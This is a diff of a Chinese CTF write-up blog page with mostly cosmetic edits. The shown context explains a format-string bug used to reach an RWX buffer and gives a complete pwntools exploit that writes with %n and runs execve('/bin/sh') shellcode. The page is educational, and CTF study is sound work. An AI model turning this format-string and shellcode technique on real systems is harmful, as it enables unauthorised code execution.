@@ -35,7 +35,7 @@
 <meta property="og:image" content="https://tsuk1ctf.github.io/post/51907/1734435204370-2d0b3e88-0b50-436b-863c-04d814246ac7-1735102388941-65.png">
 <meta property="og:image" content="https://tsuk1ctf.github.io/post/51907/1734435262487-0b599027-957d-4b5b-8c9a-2a4ea4f395a5-1735102388941-66.png">
 <meta property="article:published_time" content="2024-12-25T12:08:19.000Z">
-<meta property="article:modified_time" content="2025-01-19T03:01:10.304Z">
+<meta property="article:modified_time" content="2025-07-11T13:14:26.004Z">
 <meta property="article:author" content="Tsuk1">
 <meta property="article:tag" content="Tsuk1">
 <meta name="twitter:card" content="summary_large_image">
@@ -232,7 +232,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          736 字
+          738 字
         
       </span>
     
@@ -304,7 +304,7 @@
 <p>vuln 函数中有三个函数被调用</p>
 <img src="/post/51907/1734434912123-6fbca87a-e9db-4274-89ff-0f21a0d8f500-1735102388941-63.png" srcset="/img/loading.gif" lazyload class="" title="img">
 
-<p>vuln1 函数中，主要逻辑就是判断输入 east 还是 west，选择 east 才可以返回从而执行下一个函数，选择 west 会退出</p>
+<p>vuln1 函数中，主要逻辑就是判断输入的是 east 还是 west，选择 east 才可以返回从而执行下一个函数，选择 west 会退出</p>
 <img src="/post/51907/1734434969108-2c0a5f39-bfb8-427b-9382-cfe2121221cc-1735102388941-64.png" srcset="/img/loading.gif" lazyload class="" title="img">
 
 <p>vuln2 函数，这里存在一个格式化字符串漏洞</p>
@@ -313,10 +313,9 @@
 <p>vuln3 函数，result 的值等于 secret[1] 即 233，然后判断 secret 是否等于 result；if 中将 buf 用 mmap 函数设置成了可读可写可执行，然后用 read 对 buf 进行读入</p>
 <img src="/post/51907/1734435262487-0b599027-957d-4b5b-8c9a-2a4ea4f395a5-1735102388941-66.png" srcset="/img/loading.gif" lazyload class="" title="img">
 
-<p>思路很明显就是在 vuln3 函数中往 buf 注入 shellcode，但是需要 secret 等于 result，我们知道 secret 是 666，而 result 是 233；此时我们可以利用 vuln2 函数的格式化字符串漏洞将 secret 改成 233 ，或者将 secret[1] 改成 666</p>
+<p>思路很明显就是在 vuln3 函数中往 buf 注入 shellcode，但是需要 secret 等于 result。我们知道 secret 是 666，而 result 是 233；此时我们可以利用 vuln2 函数的格式化字符串漏洞将 secret 改成 233 ，或者将 secret[1] 改成 666</p>
 <p>exp</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;secret[0] is &quot;</span>)<br>secret = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;secret:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(secret)))<br>p.recvuntil(<span class="hljs-string">&quot;secret[1] is &quot;</span>)<br>secret1 = <span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;secret1:&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">hex</span>(secret1)))<br><br><span class="hljs-comment"># attach(p, &#x27;b *0x400A37&#x27;)</span><br>p.recvuntil(<span class="hljs-string">&quot;east or west?:&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;east&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&#x27;Give me an address&#x27;&quot;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;11&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;And, you wish is:&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;%233c&#x27;</span> + <span class="hljs-string">b&#x27;%10$n&#x27;</span><br>payload = payload.ljust(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>payload += p64(secret)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">&quot;Wizard: I will help you! USE YOU SPELL&quot;</span>)<br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rbx, 0x68732f6e69622f</span><br><span class="hljs-string">    push rbx</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    xor rdx, rdx</span><br><span class="hljs-string">    mov rax, 59</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">  &#x27;&#x27;&#x27;</span>)<br>p.sendline(shellcode)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
-
 
                 
               </div>
